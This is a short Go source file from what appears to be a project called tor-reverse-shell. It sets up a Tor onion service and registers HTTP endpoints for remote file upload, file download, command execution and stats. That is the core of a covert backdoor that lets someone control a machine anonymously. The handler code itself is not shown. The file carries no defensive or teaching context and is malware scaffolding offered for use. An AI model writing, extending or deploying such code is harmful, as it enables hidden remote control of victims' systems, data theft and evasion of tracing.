package reverse_shell

import (
	"net/http"

	"github.com/humbertovnavarro/tor-reverse-shell/pkg/tor"
)

func Start() error {
	tor, err := tor.New()
	if err != nil {
		return err
	}
	HandleRestFunc(http.MethodPost, "/command/upload", handleUpload(tor))
	HandleRestFunc(http.MethodPost, "/command/download", handleDownload(tor))
	HandleRestFunc(http.MethodPost, "/command/exec", handleCommand(tor))
	HandleRestFunc(http.MethodGet, "/stats", handleStats(tor))
	return http.Serve(tor.Onion, http.DefaultServeMux)
}
